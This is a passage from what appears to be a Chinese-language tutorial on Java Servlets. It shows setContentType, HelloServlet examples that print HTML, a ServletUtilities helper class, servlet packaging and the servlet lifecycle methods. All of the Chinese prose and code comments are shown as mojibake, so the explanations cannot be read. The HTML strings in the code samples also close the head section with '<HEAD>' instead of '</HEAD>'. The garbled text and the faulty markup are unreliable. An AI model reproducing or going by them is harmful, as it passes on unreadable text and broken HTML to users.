ã€‚</p></li><li><p>ä¿®æ”¹ println è¯­å¥ï¼Œæ„å»ºåˆæ³•çš„ Web é¡µé¢ã€‚</p></li><li><p>ç”¨å½¢å¼è¯­æ³•æ£€éªŒå…¶ï¼ˆformat syntax validatorï¼‰æ£€æŸ¥ç”Ÿæˆçš„ HTMLã€‚</p><p>ç¬¬ä¸€æ­¥é€šè¿‡å°† HTTP Content-Type å“åº”æŠ¥å¤´è®¾ä¸º text/html æ¥å®Œæˆã€‚ä¸€èˆ¬è€Œè¨€ï¼ŒæŠ¥å¤´ä½¿ç”¨ HttpServletResponse çš„ setHeader æ–¹æ³•æ¥è®¾ç½®ï¼Œä½†ç”±äºè®¾ç½®å†…å®¹çš„ç±»å‹æ˜¯ä¸€é¡¹ååˆ†å¸¸è§çš„ä»»åŠ¡ï¼Œå› è€Œï¼ŒHttpServletResponse æä¾›ç‰¹æ®Šçš„ setContentType æ–¹æ³•ï¼Œä¸“é—¨ç”¨äºè¿™ç§ç›®çš„ã€‚æŒ‡æ˜ HTML çš„æ–¹å¼æ˜¯ä½¿ç”¨ text/html ç±»å‹ï¼Œå› æ­¤ï¼Œä»£ç åº”è¯¥å¦‚ä¸‹ï¼š</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">resp.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br></pre></td></tr></table></figure><p>â€‹å°½ç®¡ HTML æ˜¯ Servlet åˆ›å»ºçš„æœ€å¸¸è§çš„æ–‡æ¡£ç±»å‹ï¼Œä½†æ˜¯ï¼ŒServlet åˆ›å»ºå…¶ä»–ç±»å‹æ–‡æ¡£çš„æƒ…å†µä¹Ÿå¾ˆå¸¸è§ã€‚ä¾‹å¦‚ï¼Œä½¿ç”¨ Servlet ç”Ÿæˆçš„ Excel è¡¨æ ¼ï¼ˆå†…å®¹ç±»å‹æ˜¯ application/vnd.ms-excelï¼‰ã€JPEG å›¾åƒï¼ˆå†…å®¹ç±»å‹æ˜¯ image/jpeg ï¼‰å’Œ XML æ–‡æ¡£ï¼ˆå†…å®¹ç±»å‹æ˜¯ text/xmlï¼‰çš„æƒ…å†µä¹Ÿæ˜¯ååˆ†å¸¸è§ã€‚åŒæ—¶ï¼Œä¸€èˆ¬å¾ˆå°‘ä½¿ç”¨ Servlet ç”Ÿæˆæ ¼å¼ç›¸å¯¹å›ºå®šçš„ HTML é¡µé¢ï¼ˆå³æ¯æ¬¡è¯·æ±‚ï¼Œé¡µé¢çš„å¸ƒå±€æ”¹åŠ¨å¾ˆå°ï¼‰ï¼›è¿™ç§æƒ…å†µä¸‹ JSP å¸¸å¸¸æ›´ä¸ºæ–¹ä¾¿ã€‚</p><p>â€‹éœ€è¦æ³¨æ„çš„æ˜¯ï¼šéœ€è¦åœ¨ PrintWriter å®é™…è¿”å›ä»»ä½•å†…å®¹ä¹‹å‰ï¼Œè®¾ç½®å“åº”æŠ¥å¤´ã€‚è¿™æ˜¯ç”±äº HTTP å“åº”ç”±çŠ¶æ€è¡Œã€ä¸€ä¸ªæˆ–å¤šä¸ªæŠ¥å¤´ã€ä¸€ä¸ªç©ºè¡Œå’Œå®é™…çš„æ–‡æ¡£ä¸€æ¬¡æ¬¡åºæ„æˆã€‚åŒ…å¤´çš„å‡ºç°æ¬¡åºå¹¶ä¸é‡è¦ï¼ŒServlet ä¼šç¼“å†²æŠ¥å¤´æ•°æ®ï¼Œå°†ä»–ä»¬ä¸€æ¬¡æ³•æ¡ˆé€åˆ°å®¢æˆ·ç«¯ï¼Œå› æ­¤ï¼Œå³ä½¿åœ¨è®¾å®šæŠ¥å¤´ä¹‹åï¼Œä¾æ—§å¯ä»¥è®¾ç½®çŠ¶æ€ä»£ç ï¼ˆå±äºè¿”å›å†…å®¹çš„ç¬¬ä¸€è¡Œï¼‰ã€‚ä½†æ˜¯ï¼ŒServlet ä¸æ˜¯ä¸€å®šè¦ç¼“å†²æ–‡æ¡£æœ¬èº«ï¼Œå› ä¸ºå¯¹äºç¯‡å¹…è¾ƒé•¿çš„é¡µé¢ï¼Œç”¨æˆ·æˆ–è®¸åªå¸Œæœ›çœ‹åˆ°éƒ¨åˆ†ç»“æœã€‚Servlet å¼•æ“å¯ä»¥ç¼“å†²éƒ¨åˆ†è¾“å‡ºï¼Œä½†å¹¶æœªè§„å®šç¼“å†²åŒºçš„å¤§å°ã€‚å¯ä»¥ä½¿ç”¨ HttpServletResponse å’Œ getBufferSize æ–¹æ³•ç¡®å®šè¿™ä¸ªå¤§å°ï¼Œæˆ–ä½¿ç”¨ setBufferSize æŒ‡å®šè¿™ä¸ªå¤§å°ã€‚ä¹Ÿå¯ä»¥åœ¨ç¼“å†²åŒºå¡«æ»¡ï¼Œè¦å‘å¾€å®¢æˆ·æ—¶ï¼Œå¯¹æŠ¥å¤´è¿›è¡Œè®¾ç½®ã€‚å¦‚æœä¸ç¡®å®šç¼“å†²åŒºæ˜¯å¦å·²ç»å‘é€å‡ºå»ï¼Œå¯ä»¥ä½¿ç”¨ isCommitted æ–¹æ³•æ¥æ£€æŸ¥ã€‚åŠæ—¶å¦‚æ­¤ï¼Œæœ€ä½³çš„æ–¹æ¡ˆè¿˜æ˜¯å°† setContentType è¡Œæ”¾åœ¨ä»»ä½• PrintWrite çš„è¡Œä¹‹å‰ã€‚</p><p>â€‹<strong>è­¦å‘Šï¼šå¿…é¡»åœ¨ä¼ é€å®é™…çš„æ–‡æ¡£ä¹‹å‰è®¾å®šå†…å®¹çš„ç±»å‹ã€‚</strong></p><p>â€‹åœ¨ç¼–å†™æ„å»º HTML æ–‡æ¡£çš„ Servlet æ—¶ï¼Œç¬¬äºŒæ­¥æ—¶ç”¨ println è¯­å¥è¾“å‡º HTMLï¼ˆä¸å†æ˜¯çº¯æ–‡æœ¬ï¼‰ã€‚ä»£ç  303 åˆ—å‡ºäº† HelloServlet.java ï¼Œç»“æœå¦‚å›¾ 3.3 æ‰€ç¤ºï¼Œæµè§ˆå™¨æŒ‰ç…§ HTML æ¥æ ¼å¼åŒ–å¾—åˆ°çš„ç»“æœï¼Œè€ŒéæŒ‰ç…§çº¯æ–‡æœ¬ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä»£ç  3.3</span></span><br><span class="line"><span class="keyword">package</span> com.firstweb.study01;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/hello&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        resp.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line">        <span class="type">String</span> <span class="variable">docType</span> <span class="operator">=</span></span><br><span class="line">                <span class="string">&quot;&lt;!DOCTYPE HTML PUBLIC \&quot;-//W3C//DTD HTML 4.0&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;Transitional//EN\&quot;&gt;\n&quot;</span>;</span><br><span class="line">        out.println(docType +</span><br><span class="line">                <span class="string">&quot;&lt;HTML&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;HEAD&gt;&lt;TITLE&gt;Hello&lt;/TITLE&gt;&lt;HEAD&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;BODY BGCOLOR=\&quot;#FDF5E6\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;H1&gt;Hello&lt;/H1&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;/BODY&gt;&lt;/HTML&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹å›¾ 3.3 ï¼š</p><p><img data-src="https://img-blog.csdnimg.cn/direct/2ff45d069c9f4963b377e8952ef0ca66.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹æœ€åä¸€æ­¥æ—¶åˆé€‚ç”Ÿæˆçš„ HTML ä¸­ï¼Œä¸å­˜åœ¨æœ‰å¯èƒ½ä¼šåœ¨ä¸åŒçš„æµè§ˆå™¨ä¸Šå¼•èµ·ä¸å¯é¢„æœŸç»“æœçš„è¯­æ³•é”™è¯¯ã€‚å‚è€ƒ 3.5 èŠ‚ä¸­æœ‰å…³ HTML éªŒè¯å…¶çš„è®ºè¿°ã€‚</p><h1 id="34-servlet-çš„æ‰“åŒ…"><a class="markdownIt-Anchor" href="#34-servlet-çš„æ‰“åŒ…">#</a> 3.4ã€Servlet çš„æ‰“åŒ…ï¼š</h1><p>â€‹åœ¨äº§å“å¼€å‘è¿‡ç¨‹ä¸­ï¼Œå¤šä¸ªç¨‹åºå‘˜å¯èƒ½ä¸ºåŒä¸€æœåŠ¡å™¨å¼€å‘ Servletã€‚å› æ­¤ï¼Œå°†æ‰€æœ‰çš„ Servlet æ”¾åˆ°åŒä¸€ç›®å½•ä¸­å°†ä¼šç”Ÿæˆæ•°ç›®åºå¤§ä¸”éš¾ä»¥ç®¡ç†çš„ç±»ï¼Œå¦‚æœä¸¤ä¸ªå¼€å‘äººå‘˜ä¸º Servlet æˆ–ä½¿ç”¨å·¥å…·ç±»åæ—¶ï¼Œä¸ç»æ„é—´é€‰æ‹©äº†ç›¸åŒçš„åç§°ï¼Œè¿˜ä¼šå¯¼è‡´å‘½åå†²çªã€‚ç°åœ¨ï¼Œé€šè¿‡ Web åº”ç”¨ï¼Œå¯ä»¥å°†å†…å®¹åˆ’åˆ†åˆ°å¤šä¸ªå•ç‹¬çš„ç›®å½•ä¸­ï¼Œæ¯ä¸ªç›®å½•éƒ½æœ‰è‡ªå·±çš„ä¸€å¥— Servletã€å®ç”¨å·¥å…·ç±»ã€JSP é¡µé¢å’Œ HTML æ–‡ä»¶ï¼Œé¿å…äº†è¿™ä¸ªé—®é¢˜ã€‚ç„¶è€Œï¼Œç”±äºå•ä¸ª Web åº”ç”¨ä¹Ÿå¯èƒ½æ¯”è¾ƒåºå¤§ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬ä¾æ—§éœ€è¦é‡‡ç”¨ Java ä¸­ç”¨ä»¥é¿å…å‘½åå†²çªçš„æ ‡å‡†è§£å†³æ–¹æ¡ˆï¼šåŒ…ã€‚</p><p>â€‹åœ¨å°† Servlet æ”¾åˆ°åŒ…ä¸­ï¼Œéœ€è¦æ‰§è¡Œä¸‹é¢ä¸¤ä¸ªé¢å¤–çš„æ­¥éª¤ã€‚</p><ol><li>å°†æ–‡ä»¶æ”¾åˆ°ä¸é¢„å®šçš„åŒ…ååŒ¹é…çš„å­ç›®å½•ä¸­ã€‚</li><li>åœ¨ç±»æ–‡ä»¶ä¸­æ’å…¥åŒ…è¯­å¥ã€‚</li></ol><h1 id="35-ç®€å•çš„-html-æ„å»ºå·¥å…·"><a class="markdownIt-Anchor" href="#35-ç®€å•çš„-html-æ„å»ºå·¥å…·">#</a> 3.5ã€ç®€å•çš„ HTML æ„å»ºå·¥å…·ï¼š</h1><p>â€‹ç”±äº HTML æ–‡æ¡£çš„ç»“æ„å¦‚ä¸‹ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE ...&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">HTML</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">HEAD</span>&gt;</span><span class="tag">&lt;<span class="name">TITLE</span>&gt;</span>...<span class="tag">&lt;/<span class="name">TITLE</span>&gt;</span>...<span class="tag">&lt;/<span class="name">HEAD</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">BODY</span> <span class="attr">...</span>&gt;</span>...<span class="tag">&lt;/<span class="name">BODY</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">HTML</span>&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹åœ¨ä½¿ç”¨ Servlet æ„å»º HTML æ—¶ï¼Œå¯èƒ½ä¼šç•¥å»è¿™ä¸ªç»“æ„çš„æŸä¸ªéƒ¨åˆ†ï¼Œå°¤å…¶æ˜¯ DOCTYPE è¡Œï¼Œå› ä¸ºè™½ç„¶ HTML è§„èŒƒéœ€è¦å®ƒï¼Œä½†å‡ ä¹æ‰€æœ‰ä¸»æµçš„æµè§ˆå™¨éƒ½å¿½ç•¥å®ƒã€‚æˆ‘ä»¬æä¸èµæˆè¿™ç§åšæ³•ã€‚DOCTYPE è¡Œçš„é•¿å¤„æ˜¯ï¼Œå®ƒå‘Šè¯‰ HTML éªŒè¯å™¨æ‚¨ä½¿ç”¨çš„æ˜¯ HTML çš„å“ªä¸ªç‰ˆæœ¬ï¼Œä»è€ŒéªŒè¯å™¨çŸ¥é“åº”è¯¥æŒ‰ç…§å“ªç§è§„èŒƒå¯¹æ–‡æ¡£è¿›è¡Œæ£€æŸ¥ã€‚è¿™äº›éªŒè¯å™¨å¯¹è°ƒè¯•å¾ˆæœ‰ä»·å€¼ï¼Œèƒ½å¤Ÿå¸®åŠ©æ‚¨æ•è·é‚£äº›æ‚¨çš„è·¯ i å…°å¥‡å¯ä»¥æ¨æµ‹å‡ºæ¥ï¼Œä½†å…¶ä»–æµè§ˆå™¨åœ¨æ˜¾ç¤ºæ—¶å¯èƒ½ä¼šæœ‰å›°éš¾çš„ HTML è¯­æ³•é”™è¯¯ã€‚</p><p>â€‹æ¯«æ— ç–‘é—®ï¼Œä½¿ç”¨ println è¯­å¥ç”Ÿæˆ HTML æœ‰äº›ç¬¨é‡ï¼Œå°¤å…¶æ˜¯é‚£äº›å†—é•¿ä¹å‘³çš„è¡Œï¼Œå¦‚ DOCTYPE å£°æ˜ã€‚æœ‰äº›äººç¼–å†™å¾ˆé•¿çš„ HTML ç”Ÿæˆä½¿ç”¨å·¥å…·ç¨‹åºï¼Œç„¶åï¼Œåœ¨ç¼–å†™ Servlet æ—¶ä½¿ç”¨è¿™äº›å®ç”¨å·¥å…·ç¨‹åºï¼Œï¼Œä»¥æ­¤æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚æˆ‘ä»¬å¯¹è¿™ç±»æ‰©å±•åº“çš„æœ‰æ•ˆæ€§æŒæ€€ç–‘æ€åº¦ã€‚é¦–å…ˆä¸”æœ€é‡è¦çš„æ˜¯ï¼Œå˜æˆç”Ÿæˆ HTML çš„ä¸ä¾¿æ˜¯ JSP è§£å†³çš„ä¸»è¦é—®é¢˜ä¹‹ä¸€ã€‚å…¶æ¬¡ï¼Œç”¨æ¥ç”Ÿæˆ HTML çš„ä¾‹ç¨‹å¯èƒ½ååˆ†ç¬¨é‡ï¼Œä¸€èˆ¬å¹¶ä¸æ”¯æŒæ‰€æœ‰çš„ HTML å±æ€§ã€‚</p><p>â€‹æ ‡å‡† Servlet ä¸­ï¼ŒWeb é¡µé¢ä¸­çš„ä¸¤éƒ¨åˆ†å†…å®¹ï¼ˆDOCTYPE å’Œ HEADï¼‰ä¸€èˆ¬ä¸ä¼šå‘ç”Ÿå˜åŒ–ï¼Œå› è€Œå¯ä»¥å½’ç»“åˆ°ä¸€ä¸ªç®€å•çš„ä½¿ç”¨å·¥å…·æ–‡ä»¶ä¸­ã€‚ä»£ç  3.5 å°±æ˜¯è¿™æ ·ä¸€ä¸ªæ–‡ä»¶ï¼Œä»£ç  3.6 åˆ—å‡º HelloServlet ç±»çš„åˆä¸€ä¸ªå˜ä½“ï¼Œå®ƒä½¿ç”¨è¿™ä¸ªå®ç”¨å·¥å…·ç±»ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä»£ç  3.5</span></span><br><span class="line"><span class="keyword">package</span> com.firstweb.study01;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletUtilities</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">DOCTYPE</span> <span class="operator">=</span></span><br><span class="line">            <span class="string">&quot;&lt;!DOCTYPE HTML PUBLIC \&quot;-//W3C//DTD HTML 4.0 &quot;</span> + <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;Transitional//EN\&quot;&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">headWithTitle</span><span class="params">(String title)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (DOCTYPE + <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;HTML&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;HEAD&gt;&lt;TITLE&gt;&quot;</span> + title + <span class="string">&quot;&lt;/TITLE&gt;&lt;HEAD&gt;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä»£ç  3.6</span></span><br><span class="line"><span class="keyword">package</span> com.firstweb.study01;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/hello&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServlet3</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        resp.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line">        <span class="type">String</span> <span class="variable">title</span> <span class="operator">=</span> <span class="string">&quot;hello3&quot;</span>;</span><br><span class="line">        out.println(ServletUtilities.headWithTitle(title) +</span><br><span class="line">                <span class="string">&quot;&lt;BODY BGCOLOR=\&quot;#FDF5E6\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;H1&gt;&quot;</span> + title + <span class="string">&quot;&lt;/H1&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;/BODY&gt;&lt;/HTML&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹ç¼–è¯‘å®Œ HelloServlet3.java ä¹‹åï¼ˆä¼šå¯¼è‡´è‡ªåŠ¨ç¼–è¯‘ ServletUtilities.javaï¼‰ï¼Œéœ€è¦å°†è¿™ä¸¤ä¸ªç±»æ–‡ä»¶ç§»åŠ¨åˆ°æœåŠ¡å™¨é»˜è®¤éƒ¨ç½²ä½ç½®ï¼ˆâ€¦/WEB-INF/classesï¼‰ä¸­ï¼Œçš„ç›¸åº”çš„åŒ…ä¸­ã€‚æœ€åç»“æœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img data-src="https://img-blog.csdnimg.cn/direct/8eb34a2c73134aec92788cccbfd1c2d0.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h1 id="36-servlet-çš„ç”Ÿå‘½å‘¨æœŸ"><a class="markdownIt-Anchor" href="#36-servlet-çš„ç”Ÿå‘½å‘¨æœŸ">#</a> 3.6ã€Servlet çš„ç”Ÿå‘½å‘¨æœŸï¼š</h1><p>â€‹æœåŠ¡å™¨åªåˆ›å»ºæ¯ä¸ª  Servlet çš„å•ä¸€å®ä¾‹ï¼Œæ¯ä¸ªç”¨æˆ·è¯·æ±‚éƒ½ä¼šå¼•å‘æ–°çš„çº¿ç¨‹ â€”â€” å°†ç”¨æˆ·è¯·æ±‚äº¤ä»˜ç»™ç›¸åº”çš„ doGet æˆ– doPost è¿›è¡Œå¤„ç†ã€‚</p><p>â€‹é¦–æ¬¡åˆ›å»º Servlet æ—¶ï¼Œå®ƒçš„ init æ–¹æ³•ä¼šå¾—åˆ°è°ƒç”¨ï¼Œå› æ­¤ï¼Œinit æ˜¯æ”¾ç½®ä¸€æ¬¡æ€§è®¾ç½®ä»£ç çš„åœ°æ–¹ã€‚åœ¨è¿™ä¹‹åï¼Œé’ˆå¯¹æ¯ä¸ªç”¨æˆ·è¯·æ±‚ï¼Œéƒ½ä¼šåˆ›é€ ä¸€ä¸ªçº¿ç¨‹ï¼Œè¯¥çº¿ç¨‹è°ƒç”¨å‰é¢åˆ›å»ºçš„å®ä¾‹çš„ Servlet æ–¹æ³•ã€‚å¤šä¸ªå¹¶å‘è¯·æ±‚ä¸€èˆ¬ä¼šå¯¼è‡´å¤šä¸ªçº¿ç¨‹åŒæ—¶è°ƒç”¨ serviceã€‚ä¹‹åç”± service æ–¹æ³•ä¾æ®æ¥æ”¶åˆ°çš„ HTTP è¯·æ±‚çš„ç±»å‹ï¼Œè°ƒç”¨ doGetï¼ŒdoPostï¼Œæˆ–å…¶ä»– doXxx æ–¹æ³•ã€‚æœ€åï¼Œå¦‚æœæœåŠ¡å™¨å†³å®šå¸è½½æŸä¸ª Servlet ï¼Œå®ƒä¼šé¦–å…ˆè°ƒç”¨ Servlet çš„ destroy æ–¹æ³•ã€‚</p><h2 id="361-service-æ–¹æ³•"><a class="markdownIt-Anchor" href="#361-service-æ–¹æ³•">#</a> 3.6.1ã€service æ–¹æ³•ï¼š</h2><p>â€‹æœåŠ¡å™¨æ¯æ¬¡æ¥æ”¶åˆ°å¯¹ Servlet çš„è¯·æ±‚ï¼Œéƒ½ä¼šäº§ç”Ÿä¸€ä¸ªæ–°çš„çº¿ç¨‹ï¼Œè°ƒç”¨ service æ–¹æ³•ã€‚service æ–¹æ³•æ£€æŸ¥ HTTP è¯·æ±‚çš„ç±»å‹ï¼ˆGETï¼ŒPOSTï¼ŒPUTï¼ŒDELETE ç­‰ï¼‰å¹¶ç›¸åº”åœ°è°ƒç”¨ doGetï¼ŒdoPostï¼ŒdoPutï¼ŒdoDelete ç­‰æ–¹æ³•ã€‚</p><p>â€‹å¦‚æœéœ€è¦åœ¨ Servlet ä¸­ç­‰åŒåœ°å¤„ç† POST å’Œ GET è¯·æ±‚ï¼Œåªéœ€è¦è®© doPost è°ƒç”¨ doGet æˆ–è€…åè¿‡æ¥å³å¯ï¼Œå°½é‡åˆ«ç›´æ¥è¦†ç›– service æ–¹æ³•ã€‚</p><p>â€‹è™½ç„¶è¿™ç§æ–¹æ³•è¦å¤šå‡ºå‡ è¡Œä»£ç ï¼Œä½†ç›¸å¯¹äºç›´æ¥è¦†ç›– service ï¼Œå®ƒæœ‰å‡ ä¸ªæœ‰ç‚¹ã€‚é¦–å…ˆï¼Œä¹‹åè¿˜å¯ä»¥åŠ å…¥ doPutï¼ŒdoTrace ç­‰ï¼Œæ”¯æŒå…¶ä»–çš„ HTTP è¯·æ±‚æ–¹æ³•ã€‚ç›´æ¥è¦†ç›– service åˆ™æ’é™¤äº†è¿™ç§å¯èƒ½æ€§ã€‚å…¶æ¬¡ï¼Œè¿˜å¯ä»¥é€šè¿‡æ·»åŠ  getLastModified æ–¹æ³•ï¼ŒåŠ å…¥å¯¹ä¿®æ”¹æ—¥æœŸçš„æ”¯æŒï¼Œç”±äº getLastModified ç”±é»˜è®¤çš„ service æ–¹æ³•è°ƒç”¨ï¼Œæ‰€ä»¥è¦†ç›– service æ–¹æ³•ä¹Ÿå°±å¤±å»äº†è¿™ä¸ªé€‰é¡¹ã€‚æœ€åï¼Œservice æä¾›å¯¹ HEADï¼ŒOPTION å’Œ TRACE è¯·æ±‚çš„è‡ªåŠ¨æ”¯æŒã€‚</p><h2 id="362-dogetdopost-å’Œ-doxxx-æ–¹æ³•"><a class="markdownIt-Anchor" href="#362-dogetdopost-å’Œ-doxxx-æ–¹æ³•">#</a> 3.6.2ã€doGetï¼ŒdoPost å’Œ doXxx æ–¹æ³•ï¼š</h2><p>â€‹è¿™äº›éƒ¨åˆ†æ‰æ˜¯ Servlet çš„ä¸»ä½“ã€‚å› æ­¤ï¼Œå¯ä»¥è¦†ç›– doGet å’Œ doPostã€‚å¦‚æœæ„¿æ„ï¼Œä¹Ÿå¯ä»¥è¦†ç›– DELETE è¯·æ±‚çš„ doDeleteã€PUT è¯·æ±‚çš„ doPut ã€OPTIONS è¯·æ±‚çš„ doOptions ä»¥åŠ TRACE è¯·æ±‚çš„ doTraceã€‚ç„¶è€Œï¼Œè¦è®°ä½å·²ç»æ‹¥æœ‰å¯¹ OPTION å’Œ TRACE çš„è‡ªåŠ¨æ”¯æŒã€‚</p><p>â€‹ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä¸éœ€è¦å®ç° doHead ä»¥å¤„ç† HEAD è¯·æ±‚ï¼ˆHEAD è¯·æ±‚è§„å®šï¼ŒæœåŠ¡å™¨åº”è¯¥åªè¿”å›æ­£å¸¸çš„ HTTP æŠ¥å¤´ï¼Œä¸å«ä¸ä¹‹ç›¸å…³è”çš„æ–‡æ¡£ï¼‰ã€‚ç”±äºç³»ç»Ÿä¼šè‡ªåŠ¨è°ƒç”¨ doGet ï¼Œå¹¶ç”¨ç”Ÿæˆçš„çŠ¶æ€è¡Œå’ŒæŠ¥å¤´è®¾å®šæ¥åº”ç­” HEAD è¯·æ±‚ï¼Œæ•…è€Œï¼Œä¸€èˆ¬ä¸éœ€è¦å®ç° doHead ã€‚æœ‰æ—¶ï¼Œä¸ºäº†èƒ½å¤Ÿæ›´å¿«åœ°ç”Ÿæˆå¯¹ HEAD è¯·æ±‚çš„å“åº”ï¼Œä¼šå®ç° doHead æ–¹æ³•ã€‚</p><h2 id="363-init-æ–¹æ³•"><a class="markdownIt-Anchor" href="#363-init-æ–¹æ³•">#</a> 3.6.3ã€init æ–¹æ³•ï¼š</h2><p>â€‹å¤§å¤šæ•°æ—¶å€™ï¼ŒServlet åªéœ€å¤„ç†å•ä¸ªè¯·æ±‚çš„æ•°æ®ï¼ŒdoGet æˆ– doPost æ˜¯ç”Ÿå‘½å‘¨æœŸä¸­å”¯ä¸€éœ€è¦çš„æ–¹æ³•ã€‚ç„¶è€Œï¼Œæœ‰æ—¶å€™å¸Œæœ›åœ¨ Servlet 